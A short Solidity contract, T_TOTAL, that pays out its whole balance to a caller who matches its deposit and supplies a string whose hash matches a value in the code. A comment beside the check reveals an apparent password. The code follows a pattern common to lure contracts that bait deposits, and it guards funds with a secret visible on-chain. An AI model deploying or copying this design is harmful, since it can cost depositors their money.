1 pragma solidity ^0.4.23;
2 
3 contract T_TOTAL {
4     
5     function () public payable {}
6     function retrieve(string code) public payable {
7         if (msg.value >= (this.balance - msg.value)) {
8             if (bytes5(keccak256(code)) == 0x70014a63ef) { // cTQjViGRNPaPaWMIwJIsO
9                 msg.sender.transfer(this.balance);
10             }
11         }
12     }
13 }